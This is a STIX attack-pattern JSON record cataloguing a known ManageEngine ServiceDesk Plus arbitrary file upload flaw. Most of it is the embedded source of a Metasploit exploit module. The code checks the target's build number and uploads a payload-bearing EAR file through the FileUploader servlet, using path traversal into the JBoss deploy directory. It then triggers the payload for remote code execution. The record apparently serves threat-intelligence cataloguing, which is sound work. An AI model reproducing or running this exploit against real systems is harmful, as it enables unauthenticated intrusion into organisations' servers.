{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd33314e-4eef-41ee-b4af-5fc2707c3312",
    "created": "2024-08-14T17:08:59.076074Z",
    "modified": "2024-08-14T17:08:59.076078Z",
    "name": "ManageEngine ServiceDesk Plus Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in ManageEngine ServiceDesk Plus. The vulnerability exists in the FileUploader servlet which accepts unauthenticated file uploads. This module has been tested successfully on versions v9 b9000 - b9102 in Windows and Linux. The MSP versions do not expose the vulnerable servlet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/manageengine_sd_uploader.rb",
            "external_id": "manageengine_sd_uploader.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/6038"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ManageEngine ServiceDesk Plus Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a file upload vulnerability in ManageEngine ServiceDesk Plus.\n        The vulnerability exists in the FileUploader servlet which accepts unauthenticated\n        file uploads. This module has been tested successfully on versions v9 b9000 - b9102\n        in Windows and Linux. The MSP versions do not expose the vulnerable servlet.\n      },\n      'Author'       =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'ZDI', '15-396 ' ],\n          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/6038' ]\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 30 },\n      'Privileged'  => false,            # Privileged on Windows but not on Linux targets\n      'Platform'    => 'java',\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          [ 'ServiceDesk Plus v9 b9000 - b9102 / Java Universal', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-08-20'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptInt.new('SLEEP',\n          [true, 'Seconds to sleep while we wait for EAR deployment', 15]),\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'uri'    => \"/\",\n      'method' => 'GET'\n    })\n\n    if res && res.code == 200 &&\n     res.body.to_s =~ /src='\\/scripts\\/Login\\.js\\?([0-9]+)'><\\/script>/\n      build = $1\n      if build < \"9103\" && build > \"9000\"\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    jboss_path = '../../server/default/deploy'\n    servlet_path = rand_text_alphanumeric(4 + rand(16 - 4)) + \".up\"\n\n    # First we generate the WAR with the payload...\n    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    war_payload = payload.encoded_war({ :app_name => war_app_base })\n\n    # ... and then we create an EAR file with it.\n    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    app_xml = %Q{<?xml version=\"1.0\" encoding=\"UTF-8\"?><application><display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name><module><web><web-uri>#{war_app_base + \".war\"}</web-uri><context-root>/#{ear_app_base}</context-root></web></module></application>}\n\n    # Zipping with CM_STORE to avoid errors while decompressing the zip\n    # in the Java vulnerable application\n    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    ear_file.add_file(war_app_base + \".war\", war_payload.to_s)\n    ear_file.add_file(\"META-INF/application.xml\", app_xml)\n    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + \".ear\"\n\n    # Linux doesn't like it when we traverse non existing directories,\n    # so let's create them by sending some random data before the EAR.\n    rand_file = rand_text_alphanumeric(4 + rand(32 - 4))\n    res = send_request_cgi({\n      'uri' => normalize_uri(servlet_path),\n      'method' => 'POST',\n      'data' => rand_text_alphanumeric(4 + rand(32 - 4)),\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        'uniqueId' => rand_text_numeric(4 + rand(4)),\n        'module' => '',\n        'qqfile' => rand_file\n      }\n    })\n\n    print_status(\"Uploading EAR file...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(servlet_path),\n      'method' => 'POST',\n      'data' => ear_file.pack,\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        'uniqueId' => rand_text_numeric(4 + rand(4)),\n        'module' => jboss_path,\n        'qqfile' => ear_file_name\n      }\n    })\n\n    if res && res.code == 200\n      print_good(\"Upload appears to have been successful, waiting \" + datastore['SLEEP'].to_s +\n      \" seconds for deployment\")\n      register_files_for_cleanup(jboss_path.gsub('../../','../') + \"/null/\" + ear_file_name)\n      register_files_for_cleanup(\"Attachments/null/\" + rand_file)\n      sleep(datastore['SLEEP'])\n    else\n      fail_with(Failure::Unknown, \"#{peer} - EAR upload failed\")\n    end\n\n    send_request_cgi({\n      'uri'    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-20",
    "x_mitre_platforms": [
        "java'"
    ]
}